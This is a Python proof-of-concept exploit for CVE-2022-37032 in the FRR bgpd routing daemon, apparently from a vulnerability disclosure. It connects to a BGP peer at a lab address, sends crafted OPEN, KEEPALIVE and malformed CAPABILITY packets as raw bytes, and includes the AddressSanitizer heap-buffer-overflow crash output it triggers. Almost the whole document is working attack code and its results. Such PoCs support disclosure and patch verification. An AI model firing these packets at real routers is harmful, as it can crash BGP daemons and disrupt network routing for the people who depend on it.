'''
Poc for CVE-2022-37032.
# Pre:
You should added config options as below to right place of bgpd.conf :
`neighbor PEER capability dynamic`
'''

import socket
from time import sleep

bgp_open = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00%\x01\x04\xfd\xe9\x00\x05\xac\x11\x00\x01\x08\x02\x06\x01\x04\x00\x01\x00\x01'
bgp_keepalive = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x13\x04'
bgp_capability = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00U\x06\x01?\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

print("[+] Creating socket...")
s = socket.socket(type=socket.SOCK_STREAM)

print("[+] Connecting to server...")
s.connect(('172.17.0.2', 179))
s.send(bgp_open)
sleep(1)
s.send(bgp_keepalive)
sleep(1)
s.send(bgp_capability)
s.close()

print("[+] Poc sent")

'''Running the poc will cause the following error:
=================================================================
==34299==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60c0000900b2 at pc 0x5565c871d7c2 bp 0x7ffc1075dd00 sp 0x7ffc1075dcf0
READ of size 4 at 0x60c0000900b2 thread T0
2023/02/20 19:33:40 BGP: [P8XN0-33WQ6] 172.17.0.1 [FSM] Timer (keepalive timer expire)
2023/02/20 19:33:40 BGP: [HRDT0-0DPQ7] 172.17.0.1 sending KEEPALIVE
    #0 0x5565c871d7c1 in bgp_capability_msg_parse bgpd/bgp_packet.c:2633
    #1 0x5565c871e261 in bgp_capability_receive bgpd/bgp_packet.c:2739
    #2 0x5565c871ed9f in bgp_process_packet bgpd/bgp_packet.c:2865
    #3 0x7f51d7922d26 in thread_call lib/thread.c:2002
    #4 0x7f51d782f90b in frr_run lib/libfrr.c:1198
    #5 0x5565c85e6753 in main bgpd/bgp_main.c:519
    #6 0x7f51d7215082 in __libc_start_main ../csu/libc-start.c:308
    #7 0x5565c85e3ddd in _start (/usr/lib/frr/bgpd+0x2a2ddd)

0x60c0000900b5 is located 0 bytes to the right of 117-byte region [0x60c000090040,0x60c0000900b5)
allocated by thread T2 (bgpd_io) here:
    #0 0x7f51d7c87808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144
    #1 0x7f51d7859437 in qmalloc lib/memory.c:111
    #2 0x7f51d78f0a4a in stream_new lib/stream.c:110
    #3 0x5565c86c1ee2 in bgp_process_reads bgpd/bgp_io.c:243
    #4 0x7f51d7922d26 in thread_call lib/thread.c:2002
    #5 0x7f51d7800e45 in fpt_run lib/frr_pthread.c:309
    #6 0x7f51d77ffd15 in frr_pthread_inner lib/frr_pthread.c:158
    #7 0x7f51d73eb608 in start_thread /build/glibc-SzIz7B/glibc-2.31/nptl/pthread_create.c:477

Thread T2 (bgpd_io) created by T0 here:
    #0 0x7f51d7bb4815 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cc:208
    #1 0x7f51d77ffeb6 in frr_pthread_run lib/frr_pthread.c:177
    #2 0x5565c88c0ff8 in bgp_pthreads_run bgpd/bgpd.c:7964
    #3 0x5565c85e66fb in main bgpd/bgp_main.c:518
    #4 0x7f51d7215082 in __libc_start_main ../csu/libc-start.c:308

SUMMARY: AddressSanitizer: heap-buffer-overflow bgpd/bgp_packet.c:2633 in bgp_capability_msg_parse
Shadow bytes around the buggy address:
  0x0c1880009fc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c1880009fd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c1880009fe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c1880009ff0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c188000a000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
=>0x0c188000a010: 00 00 00 00 00 00[05]fa fa fa fa fa fa fa fa fa
  0x0c188000a020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c188000a030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c188000a040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c188000a050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c188000a060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==34299==ABORTING
'''
